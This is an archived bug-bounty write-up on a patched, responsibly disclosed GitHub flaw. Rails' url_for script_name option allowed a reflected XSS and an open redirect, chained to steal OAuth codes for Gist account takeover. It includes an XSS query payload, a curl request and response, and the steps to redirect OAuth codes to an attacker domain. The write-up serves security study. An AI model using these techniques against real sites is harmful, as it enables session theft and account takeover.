---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-10-19_github-gist-account-takeover-via-open-redirect-10000-bounty.md
original_filename: 2020-10-19_github-gist-account-takeover-via-open-redirect-10000-bounty.md
title: GitHub Gist - Account takeover via open redirect - $10,000 Bounty
category: documents
detected_topics:
- xss
- oauth
- command-injection
- mfa
- otp
- csrf
tags:
- imported
- documents
- xss
- oauth
- command-injection
- mfa
- otp
- csrf
language: en
raw_sha256: 951f99743c49f43eb92c95a3fe08c2ca44c8d9145d4d51714ff252ab18e097d4
text_sha256: a5f51cffc5bbf705450ecde5a6f5e994815d499aa74624d2f7e788a13ebdded4
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# GitHub Gist - Account takeover via open redirect - $10,000 Bounty

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-10-19_github-gist-account-takeover-via-open-redirect-10000-bounty.md
- Source Type: markdown
- Detected Topics: xss, oauth, command-injection, mfa, otp, csrf
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `951f99743c49f43eb92c95a3fe08c2ca44c8d9145d4d51714ff252ab18e097d4`
- Text SHA256: `a5f51cffc5bbf705450ecde5a6f5e994815d499aa74624d2f7e788a13ebdded4`


## Content

---
title: "GitHub Gist - Account takeover via open redirect - $10,000 Bounty"
page_title: "GitHub Gist - Account takeover via open redirect - $10,000 Bounty | devcraft.io"
url: "https://devcraft.io/2020/10/19/github-gist-account-takeover.html"
final_url: "https://devcraft.io/2020/10/19/github-gist-account-takeover.html"
authors: ["William Bowling / vakzz (@wcbowling)"]
programs: ["GitHub"]
bugs: ["Open redirect", "Account takeover"]
bounty: "10,000"
publication_date: "2020-10-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4193
---

#  GitHub Gist - Account takeover via open redirect - $10,000 Bounty 

Oct 19, 2020

While looking into bypasses for the per form CSRF token [in my last post](https://devcraft.io/2020/10/18/github-rce-git-inject.html), I was digging into every method that was used to generate urls, trying to find one that could be used to create the required token.

## Discovery

One of these was those methods was [url_for](https://api.rubyonrails.org/v6.0.2.2/classes/ActionDispatch/Routing/UrlFor.html#method-i-url_for), which is often used to generate links to other controllers. Although I was unable to find anywhere useable as a bypass, I did come across a few places that where calling `url_for` with a user a controllable hash. When this is done any extra parameters in the hash are appended to the url as a query string, but looking at the implementation and the docs showed that there are quite a few options that would be controllable:

  * `:only_path` \- If true, the relative URL is returned. Defaults to false.
  * `:protocol` \- The protocol to connect to. Defaults to ‘http’.
  * `:host` \- Specifies the host the link should be targeted at. If :only_path is false, this option must be provided either explicitly, or via default_url_options.
  * `:subdomain` \- Specifies the subdomain of the link, using the tld_length to split the subdomain from the host. If false, removes all subdomains from the host part of the link.
  * `:domain` \- Specifies the domain of the link, using the tld_length to split the domain from the host.
  * `:tld_length` \- Number of labels the TLD id composed of, only used if :subdomain or :domain are supplied. Defaults to ActionDispatch::Http::URL.tld_length, which in turn defaults to 1.
  * `:port` \- Optionally specify the port to connect to.
  * `:anchor` \- An anchor name to be appended to the path.
  * `:params` \- The query parameters to be appended to the path.
  * `:trailing_slash` \- If true, adds a trailing slash, as in “/archive/2009/”
  * `:script_name` \- Specifies application path relative to domain root. If provided, prepends application path.

I’ve previously seen in other apps the the more common options like `:protocol`, `:host` options blacklisted/removed or `:only_path` set to true to prevent them from being used (even [brakeman suggests this is safe](https://github.com/presidentbeef/brakeman/blob/v4.10.0/lib/brakeman/checks/check_redirect.rb#L107)), but had never seen the `:script_name` param before. It ended up being used by the `path_for` method and if it existed then was always used at the start of the path:
  
  
  def path_for(options)
  path = options[:script_name].to_s.chomp("/")
  path << options[:path] if options.key?(:path)
  
  add_trailing_slash(path) if options[:trailing_slash]
  add_params(path, options[:params]) if options.key?(:params)
  add_anchor(path, options[:anchor]) if options.key?(:anchor)
  
  path
  end
  

There were a couple of places in GitHub that were creating links using code similar to this:
  
  
  <a class="link" href="<%= url_for(request.query_parameters.merge(only_path: true)) %>">
  Click me
  </a>
  

Which meant that if a query string such as `?script_name=javascript:alert(1)//` was used it would end up generating the following html:
  
  
  <a class="link" href="javascript:alert(1)//user/repo/...">
  Click me
  </a>
  

So a fairly low severity reflected XSS, requiring a click, that was also blocked by the CSP, but still a pretty interesting bug.

I then came across another place using `url_for` with controllable arguments, this time as part of a redirect. The code was in the application controller and doing the following (method/param names have been changed):
  
  
  before_action :check_source
  
  def check_source
  source = params["source"]
  return redirect_to(check_source_redirect_url) if source == "message"
  end
  
  def check_source_redirect_url
  query = Addressable::URI.parse(request.env["REQUEST_URI"]).query_values || {}
  filtered_params = query.except("source", "token").merge(only_path: true)
  url_for(filtered_params)
  end
  

As this was using `only_path: true` it would normally only allow urls to the existing host and just preserve the query params, but using the trick with `script_name` had some interesting results. There is no requirement for `script_name` to start with a slash, and when used with a `redirect_to` it was appended directly to the host:
  
  
  curl -i 'http://local.dev?source=message&script_name=ggg'
  HTTP/1.1 302 Found
  X-Frame-Options: SAMEORIGIN
  X-XSS-Protection: 1; mode=block
  X-Content-Type-Options: nosniff
  X-Download-Options: noopen
  X-Permitted-Cross-Domain-Policies: none
  Referrer-Policy: strict-origin-when-cross-origin
  Location: http://local.devggg/welcome/index
  Content-Type: text/html; charset=utf-8
  Cache-Control: no-cache
  X-Request-Id: 7c8eedfa-f552-4d5a-bbcd-295f4e7fd9c0
  X-Runtime: 0.002744
  Transfer-Encoding: chunked
  
  <html><body>You are being <a href="http://local.devggg/welcome/index">redirected</a>.</body></html>
  

Since the end of the domain was controllable, if `.attacker.domain` was used as the `script_name` it would redirect to their domain. As I was still looking for CSRF bypasses I submitted the bug as just an open redirect and continued on.

## Exploit

The next day I was talking [corb3nik](https://hackerone.com/corb3nik) about the impact of open redirects, and he mentioned that OAuth tokens were often good targets. Looking at the bug again I realised that it was actually quite powerful since it was hit pretty early in the application controller meaning that it would affect pretty much any route (all of the controllers extend the application controller).

GitHub comes with a few built in OAuth applications, one of then being for Gist. GitHub Gist is the same rails app as GitHub, just behind a different hostname and has different routes exposed. When logging in to Gist, you go through the normal OAuth flow which is a whole heap of redirects looking something like:

  1. `https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https://gist.github.com/auth/github/callback`
  2. `https://gist.github.com/auth/github/callback?browser_session_id=XXX&code=YYY`
  3. `https://gist.github.com/auth/github`
  4. `https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%2Fcallback&response_type=code&state=ZZZ`
  5. `https://gist.github.com/auth/github/callback?browser_session_id=XXX&code=YYY&state=ZZZ`
  6. `https://gist.github.com/`

In order to successfully log in to Gist, an attacker would only need the `browser_session_id` and `code`, as the `client_id` is public and the `state` param can be generated by the attacker as it’s only there for CSRF prevention.

The initial redirect goes to the `redirect_uri` with the `code` and `browser_session_id`, so I tried adding `script_name=.wbowling.info` to it and low and behold it worked! I was redirect to my domain with the required parameters appended.

In a new private tab I went to `https://gist.github.com/auth/github/callback` to grab a valid `state` param, then went there again this time using the valid `browser_session_id`, `code` and `state` params and was successfully logged in.

Since GitHub and Gist use different session tokens it didn’t allow access to github.com but granted full access to Gist.

## Timeline

  * July 26, 2020 00:33:38 AEST - Reported open redirect

  * July 26, 2020 12:57:38 AEST - Updated with Gist account takeover

  * July 26, 2020 23:33:30 AEST - Report was triaged

  * July 29, 2020 (not sure exactly when) - Since the bug only affected github.com and not GHE it was hot fixed

  * October 15, 2020 05:45:45 AEDT - $10,000 bounty awarded
